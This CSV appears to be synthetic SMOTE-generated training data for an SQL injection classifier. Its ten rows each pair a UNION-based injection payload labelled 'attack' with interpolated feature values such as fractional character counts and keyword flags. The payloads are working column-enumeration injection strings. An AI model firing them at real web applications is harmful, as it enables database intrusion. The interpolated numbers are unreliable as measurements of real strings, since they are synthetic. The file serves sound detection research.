id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",nearest_attack_euclidean,R000301,0.7378349062366807,72.81275021837925,23.296812445405187,3.9822646933129806,19.0,34.81275021837924,10.0,9.0,0.2611115339480298,0.47777693210394045,0.137427123130542,0.1236844108174878,0.296812445405189,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.703187554594811,4.0,0.29681244540518903,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,0.8405960209733984,67.0,16.311130926973938,3.1319584657420783,48.75547629210425,1.0,5.244523707895745,12.0,0.7276936760015561,0.014925373134328318,0.0782764732521753,0.1791044776119403,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.3111309269739362,1.0,0.0,7.688869073026064,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.31113092697393613,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.3258854241433904,75.51096894351797,16.12225776412051,3.0816360985311,53.510968943517966,1.0,8.0,13.0,0.7085601821559567,0.013247264447456497,0.1059781155796521,0.17221443781693466,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.1222577641205087,0.0,8.877742235879492,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000234,0.5382142069257244,72.57197859569695,21.05681284258183,3.686211931129973,13.999999999999998,41.257582876557564,4.0,13.31439571913939,0.19310457740182405,0.5682745071178111,0.05517273640052117,0.18344817907984365,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.314395719139391,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000129,0.055822854798021904,69.30293068260502,19.0,3.6563386400379536,13.999999999999998,40.24234454608401,4.0,11.060586136521003,0.20206795347503517,0.5806119362271047,0.057733700992867204,0.15958640930499296,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.060586136521003,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000188,0.4130968283215909,67.76730803742922,24.0,3.8858446915776605,36.41384642994337,9.0,14.0,8.353461607485842,0.5360097167088986,0.13347823312471416,0.2076328070828887,0.12287924308349849,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.3534616074858428,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,0.4994869965569482,56.63046874541901,21.0,3.7300222388995237,13.999999999999998,21.68124998778402,12.739062509161984,8.210156248473004,0.2473285222651737,0.38182222288363354,0.22595670038656324,0.14489255446462956,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7898437515269972,0.0,0.0,3.4203124969460053,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,0.5843618071261146,59.74226978345297,20.725773021654703,3.723268724665354,13.999999999999998,21.096907913381187,15.096907913381186,9.548453956690594,0.23556120006065948,0.3528877599878681,0.25193295996187115,0.15961807998960123,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.274226978345297,0.0,0.0,3.2742269783452964,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000310,6.630441265284432,70.84524759883512,26.49634430679624,4.130943795299009,37.20146227728151,16.194150890873985,10.899268861359248,6.550365569320376,0.5319783809997491,0.22031806302116233,0.15384615384615385,0.09385740213293464,0.0,2.3489032920388713,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.6510967079611283,1.0,0.0,1.0,0.0,0.5503655693203761,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.550365569320376,0.0,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000010,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000138,0.8440699197149777,74.0,21.371186415915055,3.7077275914210945,13.999999999999998,42.74237283183011,5.257627168169887,12.0,0.1891891891891892,0.5775996328625691,0.07104901578607957,0.16216216216216217,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3144067920424718,0.0,0.0,8.685593207957528,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3144067920424718,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
